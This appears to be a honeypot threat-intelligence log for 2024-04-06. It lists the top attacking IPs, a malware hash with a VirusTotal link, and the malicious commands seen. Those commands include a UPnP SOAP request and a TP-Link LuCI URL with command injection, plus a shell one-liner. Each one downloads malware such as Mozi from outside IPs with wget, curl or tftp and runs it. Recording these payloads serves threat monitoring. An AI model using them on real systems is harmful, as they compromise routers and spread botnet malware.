@@ -1,0 +1,32 @@
+Top 5 IPs for 2024-04-06 :
+
+112.6.41.110
+122.194.11.81
+181.67.251.79
+182.126.112.218
+104.152.52.201
+
+Malware Download:
+18e0f574bf11bc5e7de8c95b83c187649b2d87d74651e59d9c2aad53ac7bb7f1
+https://www.virustotal.com/gui/file/18e0f574bf11bc5e7de8c95b83c187649b2d87d74651e59d9c2aad53ac7bb7f1
+
+
+Malcious Commands seen:
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <HOST-IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://119.179.238.174:44101/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
+
+rm -rf sh; wget http://103.163.214.97/sh || curl -O http://103.163.214.97/sh || tftp 103.163.214.97 -c get sh || tftp -g -r sh 103.163.214.97; chmod 777 sh;./sh ssh; rm -rf sh
+
+
+
